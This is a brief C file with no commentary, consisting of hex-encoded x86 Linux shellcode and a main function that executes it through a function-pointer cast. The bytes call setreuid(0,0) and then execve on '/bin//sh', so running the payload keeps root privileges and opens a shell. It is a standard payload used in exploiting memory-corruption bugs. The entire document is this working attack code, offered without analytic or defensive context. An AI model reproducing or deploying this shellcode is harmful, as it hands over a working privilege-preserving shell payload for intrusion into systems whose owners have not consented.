char code[] = 

    "\x31\xc0"  
    "\xb0\x46" 
    "\x31\xdb"  
    "\x31\xc9"                  
    "\xcd\x80"  
    "\x31\xc0"              
    "\x50"  
    "\x68\x2f\x2f\x73\x68"  
    "\x68\x2f\x62\x69\x6e"              
    "\x89\xe3"  
    "\x50"
    "\x53"
    "\x89\xe1"
    "\x31\xd2"
    "\xb0\x0b"
    "\xcd\x80";


int main(int argc, char **argv)
{
    (*(void(*)())code)();
    return 0;
}
